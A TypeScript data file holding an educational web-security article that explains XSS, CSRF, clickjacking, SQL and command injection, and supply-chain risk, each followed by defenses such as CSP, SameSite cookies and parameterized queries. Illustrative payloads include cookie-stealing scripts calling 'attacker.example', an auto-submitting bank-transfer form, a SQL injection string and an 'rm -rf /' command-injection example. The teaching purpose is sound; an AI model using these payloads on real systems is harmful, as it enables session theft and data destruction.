import type { Article } from '@/types/content';

export const webSecurityDeepDiveArticle: Article = {
  id: 'web-security-deep-dive',
  slug: 'web-security-deep-dive',
  category: 'Full Stack',
  title: 'Web Security Deep Dive',
  summary:
    'A ground-up walkthrough of the attacks that actually hit real web apps: XSS, CSRF, clickjacking, and injection, told as attacker-first scenarios, followed by the browser mechanisms (CSP, SameSite cookies, CORS, secure flags) that stop each one.',
  topics: ['Web Security', 'JavaScript', 'HTTP'],
  difficulty: 'advanced',
  blocks: [
    {
      type: 'paragraph',
      text: "Picture the web as a city. Most of the time you're a resident going about your day: you log into your bank, you read a blog, you buy something online. Web security is the study of every clever way a stranger can trick that city's normal rules into working against you, and the locks, fences, and ID checks browsers and servers put in place so those tricks fail. This article walks through the handful of attack classes that make up the overwhelming majority of real-world web vulnerabilities. For each one, you'll first see the attack from the attacker's point of view: what they're actually typing, sending, or hosting, and why it works. Only after that will we get to the defense, because a defense you don't understand the reason for is just a rule you'll forget the first time it's inconvenient."
    },
    {
      type: 'callout',
      variant: 'note',
      title: 'Who is "the attacker" here?',
      text: "Not a hoodie-wearing hacker in a dark room. In almost every example below, the attacker is just someone who can get a browser to load a page they control, or someone who can get their text stored somewhere your app later displays to other people. That's it. No special access, no breaking encryption, no guessing passwords. That's what makes this category of bug so common: the bar to attempt it is extremely low."
    },

    { type: 'heading', id: 'same-origin-policy', level: 2, text: 'First, the foundation: what is "origin" and why does the browser care?' },
    {
      type: 'paragraph',
      text: 'Before any of the specific attacks make sense, you need one piece of vocabulary: origin. An origin is the combination of scheme (http vs https), hostname (app.example.com), and port (443, 3000, whatever). Two URLs are the "same origin" only if all three match exactly. https://example.com and http://example.com are different origins (different scheme). https://example.com and https://api.example.com are different origins (different hostname, even though they share a parent domain). https://example.com:3000 and https://example.com are different origins (different port).'
    },
    {
      type: 'paragraph',
      text: "Browsers enforce something called the Same-Origin Policy (SOP), and it is the single most important security mechanism in the entire browser. SOP's rule is simple: a script running on origin A cannot read data belonging to origin B. If you're logged into your bank in one tab and you visit a sketchy site in another tab, SOP is the reason that sketchy site's JavaScript cannot simply reach across and read your bank balance off the page, or read your bank's cookies, or inspect the response of a request made to your bank's API. Without SOP, the entire concept of \"tabs\" would be a security joke: any page you visited could rummage through every other page you had open."
    },
    {
      type: 'callout',
      variant: 'note',
      title: 'SOP blocks reading, not always sending',
      text: "This distinction trips people up constantly, so sit with it: SOP mostly stops a script from READING a cross-origin response. It does much less to stop a script from SENDING a cross-origin request in the first place. A form on evil.com can absolutely submit a POST request to your-bank.com, and the browser will happily attach your-bank.com's cookies to it, because that's just how browsers have always worked (cookies are scoped to a domain, not to \"which tab initiated this\"). The attacker's script never gets to read the response, but if the mere act of the request happening changes something (transfers money, changes your email, deletes your account), the attacker never needed to read the response. This exact gap is what CSRF exploits, further down."
    },
    {
      type: 'paragraph',
      text: "So where does CORS (Cross-Origin Resource Sharing) fit in? CORS is not a security feature that locks things down further. It is the opposite: CORS is the mechanism a server uses to selectively PUNCH HOLES in SOP, on purpose, for legitimate cases. Say your frontend is served from app.example.com and it needs to call an API at api.example.com. That's a cross-origin request, and by default SOP would let the browser send it but block the frontend JavaScript from reading the response. The API server can opt in to allowing it by sending back an Access-Control-Allow-Origin header naming app.example.com as trusted. The browser sees that header and, only then, lets the calling script read the response."
    },
    {
      type: 'code',
      language: 'javascript',
      code: `// Server response headers for a CORS-enabled API endpoint
Access-Control-Allow-Origin: https://app.example.com
Access-Control-Allow-Credentials: true
Access-Control-Allow-Methods: GET, POST, PUT, DELETE
Access-Control-Allow-Headers: Content-Type, Authorization`
    },
    {
      type: 'callout',
      variant: 'warning',
      title: 'Access-Control-Allow-Origin: * is a real, common footgun',
      text: 'It is tempting to just set Access-Control-Allow-Origin: * ("allow everyone") to make a CORS error go away during development, and then ship it. This means literally any website on the internet can have its JavaScript read responses from your API on behalf of whoever is visiting it. If that API returns anything sensitive and relies on cookies for auth, this is close to disabling SOP for your own users\' data. Note also: browsers refuse to combine Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true precisely because that combination is so dangerous, so you can\'t even accidentally ship the worst version of this mistake, but a wildcard origin on a non-credentialed endpoint that still returns sensitive data is still a real leak.'
    },

    { type: 'heading', id: 'xss', level: 2, text: 'XSS: Cross-Site Scripting' },
    {
      type: 'paragraph',
      text: "XSS is what happens when an attacker gets their own JavaScript to run inside your web page, in your users' browsers, as if your site wrote that code itself. Once that happens, the attacker's script has the exact same powers your own code has: it can read the DOM, read non-HttpOnly cookies, make requests to your API using the logged-in user's session, redirect the page, log keystrokes, or quietly replace a login form with a fake one that mails credentials to the attacker's server. XSS is not one bug, it's a family of three, distinguished by WHERE the malicious script comes from and HOW it ends up executing."
    },

    { type: 'heading', id: 'xss-stored', level: 3, text: 'Stored XSS: the malicious payload lives in your database' },
    {
      type: 'paragraph',
      text: 'Imagine a product review site. A user writes a review, and instead of typing an actual review, they type this into the review textbox:'
    },
    {
      type: 'code',
      language: 'javascript',
      code: `<script>
  fetch('https://attacker.example/steal?cookie=' + document.cookie);
</script>`
    },
    {
      type: 'paragraph',
      text: 'If your server saves that string as-is into the database, and later, whenever ANY visitor loads that product page, your server drops the raw stored text directly into the HTML response, the browser doesn\'t know the difference between "text the site wanted to show" and "a script tag that happens to be sitting in the HTML." It just executes the script tag. Every single visitor who views that product page runs the attacker\'s code, unknowingly, in their own logged-in session. This is called stored (or persistent) XSS because the payload is sitting in your database, waiting to detonate on anyone who loads the page. It\'s the most dangerous flavor precisely because one successful injection compromises every future visitor, not just one victim tricked into clicking a link.'
    },

    { type: 'heading', id: 'xss-reflected', level: 3, text: 'Reflected XSS: the payload rides in on the URL' },
    {
      type: 'paragraph',
      text: 'Now imagine a site with a search page that, unwisely, echoes your search term back onto the results page: "You searched for: ladders". If it builds that message by directly interpolating the query string into HTML, an attacker can craft a URL like this and send it to a victim in an email or a chat message:'
    },
    {
      type: 'code',
      language: 'javascript',
      code: `https://shop.example.com/search?q=<script>document.location='https://attacker.example/steal?c='+document.cookie</script>`
    },
    {
      type: 'paragraph',
      text: "Nothing is stored anywhere. The malicious script exists only inside that one URL. But when the victim clicks it, their own browser sends that query string to shop.example.com, the server reflects it straight back into the HTML response unescaped, and the browser executes it. This is called reflected XSS because the server is reflecting attacker input from the request directly back into the response. The attacker has to trick one victim into clicking a crafted link each time (via phishing email, a shortened URL in a forum post, a QR code), which makes it slightly less scary than stored XSS, but it's still extremely common because search boxes, error messages (\"no results found for '...'\"), and redirect pages are everywhere and easy to get wrong."
    },

    { type: 'heading', id: 'xss-dom-based', level: 3, text: 'DOM-based XSS: the server never even sees the payload' },
    {
      type: 'paragraph',
      text: 'The first two types both involve the SERVER putting untrusted data into HTML. DOM-based XSS is different: the vulnerability lives entirely in client-side JavaScript, and the server may be completely innocent and never even see the malicious string. It happens when your own frontend code reads something attacker-controllable, like location.hash, location.search, or document.referrer, and writes it into the DOM using an API that executes HTML/script instead of treating it as plain text.'
    },
    {
      type: 'code',
      language: 'javascript',
      code: `// Vulnerable: reads the URL fragment and injects it as raw HTML
const name = new URLSearchParams(location.search).get('name');
document.getElementById('greeting').innerHTML = 'Welcome, ' + name;

// An attacker sends a victim this URL:
// https://app.example.com/?name=<img src=x onerror="fetch('https://attacker.example/steal?c='+document.cookie)">
// The browser never talks to the server about that malicious HTML, this
// code reads it straight out of the URL and injects it client-side.`
    },
    {
      type: 'callout',
      variant: 'warning',
      title: 'innerHTML is the recurring villain',
      text: "Across all three XSS variants, the actual bug at the moment of execution is almost always the same: untrusted string data being handed to an API that parses it as markup (innerHTML, outerHTML, document.write, insertAdjacentHTML, or a template engine with auto-escaping turned off) instead of an API that treats it as inert text (textContent, innerText, or a framework's default text-binding syntax). If you remember one sentence from this whole section, make it: never let untrusted data reach an HTML-parsing sink."
    },

    { type: 'heading', id: 'xss-defenses', level: 2, text: 'Defending against XSS' },
    {
      type: 'steps',
      items: [
        {
          title: 'Escape output by context, not just once',
          text: 'The same raw string needs different escaping depending on WHERE it lands. Dropping a value into HTML text needs HTML-entity escaping (< becomes &lt;). Dropping it into an HTML attribute needs attribute escaping. Dropping it into a <script> block or a JS string literal needs JavaScript escaping, which is a completely different rule set. Dropping it into a URL needs URL encoding. Using the wrong escaping for the context (a very common mistake: HTML-escaping something that lands inside a script block) leaves the door open.'
        },
        {
          title: 'Let your framework do it by default',
          text: "This is why React, Vue, and most modern frameworks HTML-escape any value you interpolate into JSX/templates automatically. {userInput} in JSX is safe by default because React escapes it before inserting it into the DOM. The danger reappears the moment you reach for an explicit escape hatch like dangerouslySetInnerHTML in React or v-html in Vue: that name is a deliberate warning label. Only ever use it on content you've run through a real sanitizer library (like DOMPurify), never on raw user input."
        },
        {
          title: 'Set a Content-Security-Policy header',
          text: "CSP is a browser-enforced allowlist for what a page is permitted to load and execute, described in full detail in the next section. A strict CSP means that even if an attacker DOES manage to slip a <script> tag into your HTML, the browser will refuse to run it because it isn't from an allowed source. CSP is a safety net, not a replacement for escaping output correctly, but it is an extremely effective safety net."
        },
        {
          title: 'Sanitize on the way in AND encode on the way out',
          text: "Sanitizing input (stripping dangerous tags/attributes when the user submits a comment) reduces what gets stored, but you still need to encode on output, because sanitization rules can have gaps or the storage format can change over time. Treat every value that came from outside your own code as guilty until proven innocent, at the point where it's about to be rendered."
        }
      ]
    },

    { type: 'heading', id: 'csp', level: 2, text: 'Content-Security-Policy: telling the browser what your page is allowed to do' },
    {
      type: 'paragraph',
      text: 'CSP is an HTTP response header (or an equivalent <meta> tag) that lists, directive by directive, which sources of scripts, styles, images, fonts, and other resources the browser should trust for this page. Anything not on the allowlist, the browser silently refuses to load or execute, no matter how it got into the HTML. Think of it as a bouncer standing at the door of every <script>, <img>, and fetch() call on the page, checking IDs against a guest list you wrote.'
    },
    {
      type: 'code',
      language: 'javascript',
      code: `Content-Security-Policy:
  default-src 'self';
  script-src 'self' https://cdn.example.com;
  style-src 'self' 'unsafe-inline';
  img-src 'self' https://images.example.com data:;
  connect-src 'self' https://api.example.com;
  frame-ancestors 'none';
  object-src 'none';
  base-uri 'self';`
    },
    {
      type: 'table',
      columns: ['Directive', 'Controls', 'Common value'],
      rows: [
        ['default-src', 'Fallback for any directive not explicitly listed', "'self' (same origin only)"],
        ['script-src', 'Where JavaScript is allowed to load/execute from', "'self' plus specific trusted CDNs, never 'unsafe-inline'"],
        ['style-src', 'Where CSS is allowed to load from', "'self', sometimes 'unsafe-inline' if inline styles are unavoidable"],
        ['img-src', 'Where images can be loaded from', "'self' plus image CDNs, data: for inline base64 images"],
        ['connect-src', 'Where fetch/XHR/WebSocket connections can go', "'self' plus your API's origin"],
        ['frame-ancestors', 'Who is allowed to embed THIS page in an iframe', "'none' or a specific trusted origin, defends clickjacking"],
        ['object-src', 'Whether <object>/<embed>/<applet> can load', "'none', almost always, this tag family is legacy and risky"],
        ['base-uri', 'What <base href> is allowed to be set to', "'self', stops an attacker from hijacking relative URLs"]
      ]
    },
    {
      type: 'paragraph',
      text: "The single highest-value thing a CSP does is forbid inline scripts by default. If your policy doesn't include 'unsafe-inline' in script-src, the browser refuses to execute ANY <script>...</script> written directly in the HTML, and any onclick=\"...\" style inline event handler, no matter what's in it. This is precisely the injection vector stored and reflected XSS rely on. An attacker who manages to sneak a <script> tag into your HTML through an unescaped input field has still lost, because the browser won't run it. That said, a policy with 'unsafe-inline' in it (very common on older sites that haven't cleaned up inline handlers) gives up most of this protection, so it's worth checking what's actually in a site's CSP, not just whether one exists."
    },
    {
      type: 'callout',
      variant: 'tip',
      title: 'CSP as a diagnostic tool, not just a defense',
      text: "Set a page's CSP to Content-Security-Policy-Report-Only first (instead of the enforcing header) while rolling it out. The browser will report violations to a URL you specify without actually blocking anything, which lets you find every inline script and third-party resource your page ACTUALLY uses before you flip on enforcement and potentially break your own site."
    },

    { type: 'heading', id: 'csrf', level: 2, text: 'CSRF: Cross-Site Request Forgery' },
    {
      type: 'paragraph',
      text: "Here's the scenario. You log into your bank's website, your-bank.com. The bank sets a session cookie in your browser so it remembers you're logged in on every subsequent request. You don't log out, you just open a new tab and browse to a totally unrelated site, funny-cat-pictures.example, which happens to be run by an attacker. Sitting invisibly on that page is this:"
    },
    {
      type: 'code',
      language: 'javascript',
      code: `<!-- Hidden on the attacker's page, auto-submits on load -->
<form action="https://your-bank.com/transfer" method="POST" id="evil-form">
  <input type="hidden" name="to" value="attacker-account-number" />
  <input type="hidden" name="amount" value="5000" />
</form>
<script>document.getElementById('evil-form').submit();</script>`
    },
    {
      type: 'paragraph',
      text: "The moment that page loads, the browser submits this form to your-bank.com. Crucially, the browser automatically attaches YOUR your-bank.com cookies to that request, because that's just how cookies work: they're attached based on the destination domain, regardless of which page told the browser to make the request. As far as your bank's server can tell, this is a completely normal, authenticated request from you: your session cookie is present, so it looks legitimate, and the transfer goes through. You never clicked a button on the bank's site. You never even saw the form. All it took was you having a valid session cookie AND visiting a page the attacker controls, at the same time."
    },
    {
      type: 'callout',
      variant: 'warning',
      title: 'CSRF specifically exploits ambient authority',
      text: "The deep reason CSRF works is that cookies are \"ambient\": once set, the browser attaches them automatically to every matching request, with no per-request decision from the user and no way for the destination site to tell whether the REQUEST was intentional or forged. Contrast this with an Authorization: Bearer <token> header, which the attacker's cross-origin form genuinely cannot set (form submissions can't add custom headers, and JavaScript on evil.com can't read a token stored in your-bank.com's own storage due to Same-Origin Policy). This is exactly why a lot of modern token-based APIs are naturally immune to classic CSRF, though they introduce their own risk: if that bearer token is stored somewhere JavaScript can read it (like localStorage), then XSS on that same site can steal it directly."
    },

    { type: 'heading', id: 'csrf-defenses', level: 2, text: 'Defending against CSRF' },
    {
      type: 'steps',
      items: [
        {
          title: 'SameSite cookies (the modern, mostly-automatic defense)',
          text: "SameSite is a cookie attribute that tells the browser when it's allowed to send this cookie on a cross-site request. Strict means never send it cross-site, period, even if the user clicks a link from another site (this can be too aggressive for some flows, like arriving at your site from a link in an external email). Lax, the modern browser default when a cookie doesn't specify SameSite at all, sends the cookie on top-level navigations (clicking a link that takes you TO the site) but withholds it on cross-site subresource requests and form POSTs made FROM another page, which is exactly the CSRF scenario above. None sends the cookie everywhere regardless of origin, and browsers require it to be paired with Secure. For most session cookies, Lax alone silently defeats the classic CSRF form-POST attack."
        },
        {
          title: 'CSRF tokens (the belt-and-suspenders defense)',
          text: "A random, unpredictable token is generated per session (or per form) and embedded in the page, typically as a hidden form field or a custom request header. The server requires this token to be present and correct on every state-changing request (POST/PUT/DELETE), and rejects the request otherwise. An attacker's cross-origin form has no way to read this token off your bank's page (Same-Origin Policy again) and so can't include it in the forged request. This defense predates SameSite cookies and is still recommended as a second layer, especially for older browsers or for APIs that intentionally use SameSite=None."
        },
        {
          title: 'Check the Origin/Referer header server-side',
          text: "As a cheap extra check, servers can verify that state-changing requests actually originated from their own domain by inspecting the Origin or Referer header the browser sends. It's not bulletproof on its own (these headers can be missing in some edge cases), but combined with SameSite and/or CSRF tokens it adds defense in depth."
        }
      ]
    },
    {
      type: 'table',
      columns: ['Defense', 'What it targets', 'Where it lives'],
      rows: [
        [
          'SameSite=Lax/Strict cookie attribute',
          'Stops the browser from attaching the cookie to a forged cross-site request at all',
          'Set-Cookie header, server-side'
        ],
        [
          'CSRF token',
          "Requires proof the request came from the site's own page, which cross-origin attackers can't forge",
          'Hidden form field / custom header, checked server-side'
        ],
        [
          'Bearer token auth (no cookies)',
          "Removes ambient auth entirely, forged form can't attach it",
          'Authorization header, but now vulnerable if XSS can steal the token'
        ]
      ]
    },

    { type: 'heading', id: 'cookies', level: 2, text: 'Secure cookie flags: three small attributes that matter a lot' },
    {
      type: 'paragraph',
      text: 'A session cookie, if stolen, is often just as good to an attacker as a stolen password: it lets them impersonate a logged-in user without needing any credentials. Three attributes, all set by the server in the Set-Cookie response header, control how much exposure a cookie has.'
    },
    {
      type: 'code',
      language: 'javascript',
      code: `Set-Cookie: session=abc123; HttpOnly; Secure; SameSite=Lax; Path=/; Max-Age=3600`
    },
    {
      type: 'table',
      columns: ['Flag', 'What it does', 'What it defends against'],
      rows: [
        [
          'HttpOnly',
          'Makes the cookie invisible to JavaScript, document.cookie simply will not return it',
          "XSS-based cookie theft: even a successful script injection can't read this cookie"
        ],
        [
          'Secure',
          'Cookie is only ever sent over HTTPS, never plain HTTP',
          'Network eavesdroppers on an insecure connection (public WiFi, a compromised router) intercepting the cookie in transit'
        ],
        ['SameSite', 'Controls whether the cookie is sent on cross-site requests (Strict/Lax/None)', 'CSRF, as covered above']
      ]
    },
    {
      type: 'callout',
      variant: 'tip',
      title: 'A good default for a typical session cookie',
      text: "HttpOnly; Secure; SameSite=Lax covers the common case well: JavaScript (including any XSS payload) can't read it, it never travels over plaintext HTTP, and it's withheld on forged cross-site form submissions while still working normally when a user clicks into your site from elsewhere."
    },

    { type: 'heading', id: 'clickjacking', level: 2, text: 'Clickjacking: tricking a click, not stealing data' },
    {
      type: 'paragraph',
      text: 'Imagine an attacker builds a page that looks like a harmless "Click here to win a prize" button. Underneath it, invisible, they\'ve placed an iframe pointing at your real site, e.g. your-bank.com/delete-account, positioned with CSS so the REAL "Delete my account" button sits exactly under the fake prize button, with the iframe\'s opacity set to near-zero. The victim sees only the prize button, clicks it, and their click actually lands on the invisible, real button underneath, on the real site, in their own authenticated session.'
    },
    {
      type: 'code',
      language: 'javascript',
      code: `<style>
  iframe { position: absolute; top: 0; left: 0; opacity: 0.01; width: 300px; height: 50px; }
  .fake-button { position: absolute; top: 0; left: 0; }
</style>
<!-- Real, sensitive action page loaded invisibly underneath -->
<iframe src="https://your-bank.com/delete-account?confirm=true"></iframe>
<!-- Fake, enticing button drawn on top, at the exact same coordinates -->
<button class="fake-button">Click here to claim your prize!</button>`
    },
    {
      type: 'paragraph',
      text: 'This is called clickjacking (or UI redress attack) because the attacker is hijacking the semantic meaning of a click, not stealing any data directly. Unlike XSS and CSRF, the attacker never runs code on your domain and never forges a raw HTTP request themselves. They rely entirely on tricking the human, using your own real page (embedded honestly, pixel for pixel) as the thing that actually gets clicked.'
    },
    {
      type: 'steps',
      items: [
        {
          title: 'Send X-Frame-Options',
          text: 'The header X-Frame-Options: DENY tells the browser to refuse to render this page inside ANY iframe, on any site, including your own other pages. SAMEORIGIN allows framing only by pages on your own origin, useful if you legitimately embed your own pages in your own iframes elsewhere in your app.'
        },
        {
          title: "Or, the modern equivalent: CSP's frame-ancestors directive",
          text: "frame-ancestors 'none' in your Content-Security-Policy does the same job as X-Frame-Options: DENY, but as part of CSP, which is more flexible (you can list specific trusted origins allowed to frame you) and is the direction the platform has been moving. Where both headers are present, frame-ancestors takes precedence in modern browsers."
        }
      ]
    },

    { type: 'heading', id: 'injection', level: 2, text: 'Injection attacks: when user input becomes executable code somewhere else' },
    {
      type: 'paragraph',
      text: 'XSS is really a special case of a much bigger idea: injection. Injection happens anytime untrusted input is concatenated directly into something that gets INTERPRETED as code or a command, rather than treated as inert data. The most classic example is SQL injection. Imagine a login query built like this:'
    },
    {
      type: 'code',
      language: 'javascript',
      code: `// Vulnerable: string concatenation builds the query
const query = "SELECT * FROM users WHERE email = '" + email + "' AND password = '" + password + "'";

// An attacker submits this as the "email" field:
//   ' OR '1'='1
// The query the database actually executes becomes:
//   SELECT * FROM users WHERE email = '' OR '1'='1' AND password = '...'
// '1'='1' is always true, so this can return every row in the users table,
// potentially logging the attacker in as the first user found, no password needed.`
    },
    {
      type: 'code',
      language: 'javascript',
      code: `// Fixed: parameterized query, the driver keeps data and code strictly separate.
// The database treats $1/$2 as pure data, never as part of the query's grammar,
// no matter what characters they contain.
const query = 'SELECT * FROM users WHERE email = $1 AND password_hash = $2';
db.query(query, [email, passwordHash]);`
    },
    {
      type: 'paragraph',
      text: "The exact same shape of bug shows up in NoSQL injection (attacker-controlled JSON operators like $ne or $gt sneaking into a MongoDB query object), and command injection (untrusted input reaching a shell command, e.g. exec('convert ' + filename + ' output.png') where filename contains ; rm -rf /). In every case, the fix is structurally identical: never build a command/query by string-concatenating untrusted input into it. Use parameterized queries / prepared statements for SQL, use your ORM/driver's structured query builders (never raw string interpolation) for NoSQL, and avoid shelling out to raw commands with user input entirely if you can, or strictly allowlist/escape arguments if you truly can't."
    },

    { type: 'heading', id: 'dependency-risk', level: 2, text: "Supply-chain and dependency risk: the vulnerability you didn't write" },
    {
      type: 'paragraph',
      text: "A modern frontend app might pull in hundreds or thousands of npm packages once you count transitive dependencies (dependencies of your dependencies, several layers deep). Every one of those packages runs with the same privileges as your own code once it's in your bundle or your build process. This has become one of the fastest-growing categories of real-world breaches, and it doesn't require the attacker to find a bug in YOUR code at all."
    },
    {
      type: 'list',
      style: 'unordered',
      items: [
        "Known-vulnerability risk: a package you depend on has a publicly disclosed CVE (an SQL injection in an ORM, a prototype pollution bug in a utility library) and you're on the vulnerable version. This is the most common case and the most fixable: run npm audit / pnpm audit regularly and keep dependencies current.",
        "Malicious package risk: an attacker publishes a brand-new package with a name deceptively close to a popular one (typosquatting, e.g. 'reqeust' instead of 'request'), or compromises a maintainer's account on an existing popular package and slips malicious code into a new version. That code then runs on every machine that installs it, including CI servers with deploy credentials.",
        'Build-time vs runtime exposure: a compromised dev-dependency (a linter plugin, a build tool) can exfiltrate secrets from your CI environment even if it never ships to production, because it runs during your build, which usually has access to API keys and deploy tokens.',
        "Practical mitigations: pin exact dependency versions with a lockfile (already default in npm/pnpm/yarn), review the diff before bumping a major version of anything security-sensitive, prefer packages with an active maintenance history over ones that haven't been touched in years, and treat npm audit/Dependabot/Snyk alerts as something to actually triage, not just dismiss."
      ]
    },

    { type: 'heading', id: 'putting-it-together', level: 2, text: 'Putting it all together: one page, all the layers' },
    {
      type: 'paragraph',
      text: "None of these defenses work in isolation as well as they work stacked together. A single real login form, for example, benefits from several of these mechanisms simultaneously: framework auto-escaping (or a sanitizer) stops attacker input from becoming executable markup in the first place (defeats XSS); a strict CSP means that even if something slips through, the browser won't run an inline script anyway (defense in depth against XSS); the session cookie is HttpOnly so even a successful XSS can't read it directly, Secure so it never crosses the network in plaintext, and SameSite=Lax so a forged cross-site form can't ride on it (defeats CSRF and reduces XSS's blast radius); frame-ancestors 'none' stops the login page from being invisibly framed for a clickjacking attack; and the login query itself is parameterized so no amount of creative input in the email/password fields can rewrite the SQL being run (defeats injection). Each layer covers a gap the others don't, which is exactly the point: security is rarely one silver-bullet fix, it's several independent, overlapping nets."
    },
    {
      type: 'table',
      columns: ['Attack', 'One-line mechanism', 'Primary defense'],
      rows: [
        [
          'Stored XSS',
          'Malicious script saved to your database, served to every future visitor',
          'Output encoding by context + CSP + never trust dangerouslySetInnerHTML with raw input'
        ],
        ['Reflected XSS', 'Malicious script riding in the URL, echoed back by the server unescaped', 'Output encoding by context + CSP'],
        [
          'DOM-based XSS',
          'Client-side JS writes untrusted data (URL, referrer) into an HTML-parsing sink',
          'Avoid innerHTML/document.write with untrusted data, use textContent or a sanitizer'
        ],
        ['CSRF', "A forged cross-site request rides on the victim's ambient auth cookie", 'SameSite cookies + CSRF tokens'],
        ['Clickjacking', 'Real page framed invisibly under a fake UI to hijack a click', 'X-Frame-Options / CSP frame-ancestors'],
        [
          'SQL/NoSQL/command injection',
          'Untrusted input concatenated directly into a query or command',
          'Parameterized queries, never string concatenation'
        ],
        [
          'Supply-chain compromise',
          'A dependency you trust ships malicious or vulnerable code',
          'Lockfiles, dependency audits, minimal/reviewed dependencies'
        ]
      ]
    }
  ]
};
